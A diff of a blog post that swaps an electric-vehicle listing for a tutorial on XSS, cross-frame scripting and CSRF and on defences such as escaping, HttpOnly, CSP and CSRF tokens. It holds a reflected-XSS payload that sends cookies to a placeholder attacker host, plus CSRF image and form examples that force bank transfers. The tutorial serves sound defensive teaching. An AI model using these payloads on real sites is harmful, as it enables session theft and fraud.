@@ -3,139 +3,184 @@ layout: post
 title: Prevent XSS and CSRF attacks on your website
 date: 2019-08-19 121:02:20 +0300
 description: what are xss and csrf attacks and how can we prevent them? # Add post description (optional)
-img: tesla-model-3-review-01.jpg # Add image post (optional)
-fig-caption: # Add figcaption (optional)
-tags: [Pure Electric Car,New Enegy,新能源]
+img: prevent-xss-csrf.png # Add image post (optional)
+fig-caption: none # Add figcaption (optional)
+tags: [csrf, xss, browser, attack, xfs, security, web, hacking,cookies, website, svg]
 ---
-### 1. _DD6610EV12_
-#### _车型展示_
 
-```php
-<?php
-    phpinfo();
-?>
+### 1. **What is XSS: Cross-site scripting?**
+
+In case of XSS, the attacker makes the victim's browser execute a script (mostly JavaScript) that has been injected by the attacker while visiting a trusted web site. The attacker has several ways of injecting the JavaScript into a web site that the victim trusts.
+
+XSS doesn't need an authenticated session and can be exploited when the vulnerable website doesn't do the basics of validating or escaping input.
+
+When the server doesn't validate or escape input as a primary control, an attacker can send inputs via request parameters or any kind of client side input fields (which can be cookies, form fields or url params). These can be written back to screen, persisted in database or executed remotely.
+
+Be aware using shorten URLs as you don't know where they can lead! First check where the hidden link leads using unshorten.it. After receiving the final link, check it out on the VirusTotal website. It is also suggested to have it as a browser extension.
+
+### 2. **Reflected XSS (aka Non-Persistent or Type II XSS)**
+
+Reflected attacks are those where the malicious script is reflected by a web server and then executed by the the web browser. In this type of attack a user is tricked into clicking a link, or filling in a form, that has the script hidden in it. This can be achieved by sending an email, or posting the link on a forum.
+
+As the domain that the victim can see in the URL is well known and trusted, the victim won't expect any harm behind it. When this is submitted to the server it will be rejected and reflected back to the browser. Many servers will send the input back in text format so the browser can display the input that was rejected. If this text is a valid script then the browser will execute it as it is coming from a trusted source. The attacker could use the victim's CPU to calculate bitcoins in the browser or could steal the victim's cookie.
+
+```html
+https://google.com?query=<script>new Image().src="http://attackerurl.org/storecookie?cookie="+document.cookie;</script>
+```
+![reflected xss attack]({{site.baseurl}}/assets/img/prevent-xss-csrf-1.png)
+
+### 2. **Stored XSS (aka Persistent or Type I XSS)**
+
+Besides injecting the script using query parameters, the attacker may also inject the script persistenly into a web site's storage. The storage can be in a database, in a web page component like a message forum, visitor log, comment field, or other element that goes to make up a page to deliver to a user. In case, a forum that doesn't validate the user's input, website could be compromissed by posting something that contains the malicious script. The malicious script is delivered along with the normal web content and the client executes it. Every user of the forum that reads the attacker's post will become a victim.
+
+![stored xss attack]({{site.baseurl}}/assets/img/prevent-xss-csrf-2.png)
+
+### 3. **What is XFS: Cross Frame Scripting?**
+
+Cross-Frame Scripting (XFS) is an attack that combines malicious JavaScript with an iframe that loads a legitimate page in an effort to steal data from an unsuspecting user. This attack is usually only successful when combined with social engineering. An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes.
+
+The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
+
+```html
+X-Frame-Options: deny
+X-Frame-Options: sameorigin
+X-Frame-Options: allow-from https://example.com/
 ```
 
-```python
-#!/usr/bin/python
+### 3. **JavaScript in image tags**
 
-import math
+Directly injecting JavaScript code in the source attribute of <img> tag is no longer possible on modern browsers.
 
-define myFunction():
-    suite
-````
+But SVG is an XML based vector graphic format, therefore it invokes the XML parser in the browser. Moreover, <script> tag is allowed in the SVG, so JavaScript can be embed directly into SVG.
 
-![新能源车型DD6610EV12]({{site.baseurl}}/assets/img/image_not_available.jpg)
+Browsers that support SVG inside <img> tags do not support scripting inside the context. **But you should not  use SVG inside <embed> or <object> tags where scripting is supported by browsers!**
 
-#### _车辆参数_
+![stored xss attack]({{site.baseurl}}/assets/img/prevent-xss-csrf-3.png)
 
-|          |      | |           |           |  |                |       |
-|:----------:|:----------:|-|:------------:|:------------------:|-|:------------------:|:---------------:|
-|     长     |   6015mm   | |      宽      |       2025mm       | |         高         |      2650mm     |
-|    轴距    |   3715mm   | |     最高车速     |     100km/h       | |      备胎     |     全尺寸     |
-|  整备质量  |   2985kg   | | 最大总质量  |       4460kg       | |       座位数       |       10座      |
-| 续航里程数 |    210km   | |  充电方式   | 快充，先恒流后恒压 | |            保修政策        |       2年或者6万公里          |
-|  动力电池  | 镍钴锰酸锂 | |    厂家     |      上海合普      | |        型号        | DSLi71.4-350.4v |
-|  标称电压  |    350.4   | |额定输出电流 |         172        | |        电量        |      68kwh      |
-|    电机    |  永磁同步  | |    型号     |       TM5002       | |      电机厂家      |     北京精进    |
-|  额定功率  |     100    | |  额定转速   |        2300        | |      额定转矩      |       400       |
-|  峰值功率  |     150    | |  峰值转速   |        6000        | |      峰值转矩      |       600       |
-|  布置形式  |    纵置    | |  布置位置   |        前置        | |                    |                 |
-|  冷却方式  |    水冷    | |电机控制型号 |       CU5012       | | 电机控制器生产厂家 |     北京精进    |
+Allowing SVG inside <img>may be dangerous when:
 
-#### _车辆销售方式_
+* An XML parser is used to parse the SVG, whether it is inside the <img> or <object> tag. The parser is certainly tweaked with some parameters to ignore <script> tags in the <img> context. Yet, that is quite ugly, it is blacklisting a tag in a certain context. And blacklisting is poor security.
+* <script> is not the only way to achieve execution context in SVG, there are also the onmouseover (and family) events present in SVG. This is again tricky to blacklist.
+* The XML parser in browsers did suffer from problems in the past, notable with XML comments around script blocks. SVG may present similar problems.
+* SVG has full support for XML namespaces. xlink:href is a completely valid construct in SVG and the browser inside the XML parser context will likely follow it.
+Therefore, SVG opens several possible vectors to achieve execution context. And moreover, it is a relatively new technology and therefore not well hardened.
 
-|          	|                 	|     	|
-|:------------:	|:--------------------------:	|:--------:	|
-|   上牌时间   	|         2016年12月         	|          	|
-|   以租代售   	|           保证金           	|     ~    	|
-|              	|            租金            	|     ~    	|
-| 经销商销售价 	|           16.8万           	|  	|
-|     置换     	|           保证金           	|    5万   	|
-|              	|           置换额           	|   60万   	|
-|     备注     	| 只含第一年交强险可直接过户 	|          	|
+### 3. **What is CSRF: Cross-site request forgery?**
 
-### 2. _优优EV235_
-#### _车型展示_
+In a CSRF attack, the attacker tries to force/trick you into making a request which you did not intend, making use of the existing victim's context, such as cookies. Every time you interact with website, its server checks the cookie you send with the request so it knows it's you.
 
-![新能源车型优优EV235]({{site.baseurl}}/assets/img/优优EV235-正面.jpg)
-![新能源车型优优EV235]({{site.baseurl}}/assets/img/优优EV235-侧面.jpg)
-![新能源车型优优EV235]({{site.baseurl}}/assets/img/优优EV235-后观.jpg)
-![新能源车型优优EV235]({{site.baseurl}}/assets/img/优优EV235-外观.jpg)
-![新能源车型优优EV235]({{site.baseurl}}/assets/img/优优EV235-内观.jpg)
+The level of the attack is based upon the level of privileges that the victim possessed. Because attacker will use the authentication that has gained in the current session to do the malicious task. This is the reason why this attack termed as Session Riding too.
 
-#### _车辆参数_
+#### **Using a GET request (rare case)**
 
-|          |      | |
-|:----------:|:----------:|:-:|
-|     整车产品名称     |   纯电动厢式运输车   | |
-|    动力电池类型-总储电量（kwh）    |   三元锂离子电池34.1   |三元锂离子电池40.2 |
-|  载货质量  |   660kg（额定载货530kg）   | 660kg（额定载货530kg） |
-| 内部空间容积  |    4.7立方米   | | 
-|  最高车速  | 100km/h |110km/h |
-|  0-50km/h加速时间  |    <=8s   | <=8s|
-|    工况法续航里程    |  >=235km  | >=275km |
-|  最小离地间隙  |     >=155mm    | |
-|  最小转弯半径  |     <=5.25m    | |
-|  涉水深度  |    >=300mm    | |
+CSRF happens in authenticated sessions when the server trusts the user/browser. Let's consider an example when you are logged in into your banking site. An attacker can place a malicious link embedded in another link or zero byte image which can be like:
 
-#### _车辆销售方式_
+```html
+<img src=yourbanking.com/transfer.do?to_account={attackers_account}&amt=2500>
+```
+Now, in the background transfer can happen though you clicked this link (of course, if your banking uses GET request for such actions without any confirmation). Depending on the vulnerable web site, using CSRF, attackers can also change your credentials or user profile properties.
 
-|          	|                 	|     	|
-|:------------:	|:--------------------------:	|:--------:	|
-|   上牌时间   	|         2017年12月         	|          	|
-|   以租代售   	|           保证金           	|     1万    	|
-|              	|            租金            	|     1900元/月（季付）含保险及运费4年以租代售    	|
-| 经销商销售价 	|           6万（不含运费）           	|  	|
-|     置换     	|           保证金           	|    ~   	|
-|              	|           置换额           	|   ~   	|
-|     备注     	|   	|          	|
+#### **Using a POST request (common and most popular case)**
 
+This attack requires the user to click the form button on hacker's website, then the malicious page could just as easily send the request by submitting the form.
 
-### 3. **K50EV**
-#### _车型展示_
+```html
+<h1>You Are a Winner!</h1>
+<form action="http://yourbanking.com/api/account/transfer" method="post">
+    <input type=hidden name=to_account value="attacker_id" />
+    <input type=hidden name=amount value="1000000" />
+    <input type=submit value="Click me to get your reward" />
+</form>
+```
+After submitting the form user could figure out what happened, but it could be too late to revert or discard these changes.
 
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-front.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-back.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-01.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-02.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-03.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-04.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-05.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-inner-06.jpg)
-![新能源车型K50EV]({{site.baseurl}}/assets/img/K50EV-engine.jpg)
+![using a POST request ]({{site.baseurl}}/assets/img/prevent-xss-csrf-4.png)
 
-#### _车辆参数_
+Moreover, using SSL does not prevent a CSRF attack, because the malicious site can send an "https://" request. Typically, CSRF attacks are possible against web sites that use cookies for authentication, because browsers send all relevant cookies to the destination web site.
 
-|          基本参数          	|                                   	|
-|:--------------------------:	|:---------------------------------:	|
-| 整车主要参数（长*宽*高）mm 	|           4450*1760*1790          	|
-|       整备质量（kg）       	|                1550               	|
-|           轴距mm           	|                2755               	|
-|         爬坡度（%）        	|                 25                	|
-|          最高车速          	|              110km/h              	|
-|    续航里程数（工况法）    	|               255km               	|
-|          动力总成          	|                                   	|
-| 电池类型                   	| 三元锂电池                        	|
-| 电机类型                   	| 永磁同步电机                      	|
-| 电池电量（kwh）            	| 45                                	|
-| 峰值功率kw                 	| 41.8                              	|
-| 峰值扭矩N.m                	| 150                               	|
-| 充电时间                   	| 快充1.5H，慢充10H                 	|
-| 制动、悬架、驱动方式       	|                                   	|
-| 驱动形式                   	| 前置前驱                          	|
-| 制动系统（前/后）          	| 盘式/盘式                         	|
-| 悬架系统（前/后）          	| 麦弗逊式独立悬架/扭转梁式螺旋弹簧 	|
+### 5. **Difference between XSS and CSRF**
 
-#### _车辆销售方式_
+Both these attacks seems to be very similar, as they are client-side attacks and doing quite similar things, enforcing some form of user activity (e.g. clicking a link or visiting a website).
 
-|          	|                 	|     	|
-|:------------:	|:--------------------------:	|:--------:	|
-|   上牌时间   	|         2017年12月         	|          	|
-|   以租代售   	|           保证金           	|     2万    	|
-|              	|            租金            	|     3200元/月（季付）含保险及运费4年以租代售    	|
-| 经销商销售价 	|           11万（不含运费）           	|  	|
-|     置换     	|           保证金           	|    2万   	|
-|              	|           置换额           	|   35万   	|
-|     备注     	|   	|          	|
+In a cross-site scripting (XSS) attack, the attacker makes you involuntarily execute client-side code, most likely Javascript. In a cross-site request forgery (CSRF) attack, the attacker manipulates you to making a melicoius request to the server which you did not intend. This could be sending you a link that makes you involuntarily perform some action.
 
+XSS is generally more powerful than CSRF because it usually allows the execution of arbitrary script code while CSRF is restricted to a particular action (e.g. changing the password). A successful XSS attack also effectively bypasses all anti-CSRF measures.
+
+### 6. **Protect your website**
+
+#### **Protect against XSS attack**
+
+##### **Escape special characters, validate and sanitize inputs**
+
+> Expect any untrusted data to be malicious. What's untrusted data? Anything that originates from outside the system and you don't have absolute control over so that includes form data, query strings, cookies, other request headers, data from other systems (i.e. from web services) and basically anything that you can't be 100% confident doesn't contain evil things.
+
+> Troy Hunt
+
+**Validating input** is the process of ensuring an application is rendering the correct data and preventing malicious data from doing harm to the site, database, and users. Input validation is especially helpful and good at preventing XSS in forms, as it prevents a user from adding special characters into the fields, instead refusing the request.
+
+**Sanitizing data** is a strong defense, but should not be used alone to battle XSS attacks. Sanitizing user input is especially helpful on sites that allow HTML markup, to ensure data received can do no harm to users as well as your database by scrubbing the data clean of potentially harmful markup, changing unacceptable user input to an acceptable format.
+
+**Escaping data** means taking the data an application has received and ensuring it’s secure before rendering it for the end user. By escaping user input, key characters in the data received by a web page will be prevented from being interpreted in any malicious way. In essence, you're censoring the data your web page receives in a way that will disallow the characters – especially < and > characters – from being rendered, which otherwise could cause harm to the application and/or users. If your page doesn’t allow users to add their own code to the page, a good rule of thumb is to then escape any and all HTML, URL, and JavaScript entities.
+
+##### **HttpOnly flag for cookies**
+
+The purpose of the HttpOnly flag is to make the value of the cookie unavailable from JavaScript, so that it can not be stolen if there is a XSS vulnerability.
+
+Any attempt to access the cookie from client script is strictly forbidden. Of course, this presumes you have:
+
+A modern web browser
+A browser that actually implements HttpOnly correctly
+The good news is that most modern browsers do support the HttpOnly flag. Regardless, HttpOnly cookies are a great idea, and properly implemented, make common XSS attacks much harder to pull off.
+
+HttpOnly cookies don't make you immune from XSS cookie theft, but they raise the bar considerably. Anyway, a "set it and forget it" setting is pretty secure as all modern browsers implemented client-side HttpOnly cookie security correctly.
+
+##### **Security headers**
+
+The HTTP Content-Security-Policy response header allows web site administrators to control resources the user agent is allowed to load for a given page. With a few exceptions, policies mostly involve specifying server origins and script endpoints. This helps guard against cross-site scripting attacks (XSS).
+
+```html
+Content-Security-Policy: default-src https:; script-src https: 'unsafe-eval' 'unsafe-inline'; style-src https: 'unsafe-inline'; img-src https: data:; font-src https: data:; report-uri /csp-report
+```
+The X-XSS-Protection header is designed to enable the cross-site scripting (XSS) filter built into modern web browsers. This is usually enabled by default, but using it will enforce it.
+
+```html
+X-XSS-Protection: 1; mode=block
+```
+
+A 0 value disables the XSS Filter. A 1 value enables the XSS Filter. If a cross-site scripting attack is detected, in order to stop the attack, the browser will sanitize the page.
+
+A 1; mode=block value also enables the XSS Filter and rather than sanitize the page, when an XSS attack is detected, the browser will prevent rendering of the page.
+
+#### **Protect against CSRF attack**
+
+##### **Using CSRF-token**
+
+Because of your session is active in the browser and it has your session id, CSRF attack can happend. This is the reason the most popular CSRF protection is having another server supplied unique token generated and appended in the request as a hidden value in every state changing form which is present on the web application. This token, called a CSRF Token or a Synchronizer Token. This unique token is not something which is known to the browser like session id.
+
+Instead of putting the anti-CSRF token in the cookie, the server needs to put it as a hidden parameter in a form. For every request involving some sensitive action, the browser will send this token also along with the request and the server, before performing the action, would verify if the token is the one that it had sent to the browser or not. This additional validation at server will make sure that the attacker manipulated link.
+
+This protects the form against CSRF attacks, because an attacker has no way of performing this sensitive action on behalf of the user, as forging a request will also need to guess the anti-CSRF token. Unless an attacker won't successfully trick a victim into sending a valid request or somehow finds out the random anti-CSRF token itself.
+
+**_This token should be invalidated after some time and after the user logs out. The token have to be unique per action and have to be valid only once. Never share tokens via URLs._**
+
+##### **Using Same-site attribute for cookies**
+
+CSRF attacks are only possible since Cookies are always sent with any requests that are sent to a particular origin (domain and path), which is related to that Cookie. Due to the nature of a CSRF attack, a flag can be set against a Cookie, tuning it into a same-site Cookie. A same-site Cookie is a Cookie which can only be sent, if the request is being made from the same origin that is related to the Cookie being sent. The Cookie and the page from where the request is being made, are considered to have the same origin if the protocol, port (if applicable) and host is the same for both.
+
+When another site tries to request something from the web application, the cookie is not sent. This effectively makes CSRF impossible, because an attacker can not use a user's session from his site anymore.
+
+There are two possible values for the same-site attribute:
+
+* Strict: the cookie is withheld with any cross-site usage. Even when the user follows a link to another website the cookie is not sent.
+* Lax: some cross-site usage is allowed. Specifically, if the request is a GET request and the request is top-level. Top-level means that the URL in the address bar changes because of this navigation. This is not the case for iframes, images or XMLHttpRequests.
+
+|       		     |     		  	 	    |            		    |
+|:------------------:|:--------------------:|:---------------------:|
+| request type | html code example | cookie type |
+| link | <a href="..."> | normal, lax |
+| prerender | <link rel="prerender" href="..."> | normal, lax |
+| form GET | <form action="..."> | normal, lax |
+| form POST | <form method="post" action="..."> | normal |
+| iframe | <iframe src=...> | normal |
+| image | <img src=...> | normal |
+| AJAX | fetch('...') (JavaScript) | normal |
